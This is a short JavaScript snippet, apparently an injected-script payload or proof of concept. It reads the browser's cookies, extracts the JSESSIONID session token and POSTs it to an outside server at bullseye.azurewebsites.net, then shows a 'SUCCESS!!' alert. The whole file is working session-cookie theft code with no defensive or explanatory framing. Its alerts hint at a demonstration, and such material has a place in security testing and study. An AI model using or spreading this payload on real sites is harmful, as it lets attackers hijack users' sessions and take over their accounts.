(function () {
    var http = new XMLHttpRequest();
    var url = "http://bullseye.azurewebsites.net/home/edit/1";
    var params = '';
    
    http.open("POST", url, true);

    http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

    var cookies = document.cookie.split(';');

    for (var x = 0; x < cookies.length; x++)
    {
        var item = cookies[x];
        var pair = item.split('=');
        var name = pair[0].trim();

        if (name == 'JSESSIONID') {
            params = item.trim();
        }
    }

    if (params.length < 1) {
        alert('JSESSIONID not found.');
    } else {
        http.send(params);
        alert('SUCCESS!!');
    }
    
})();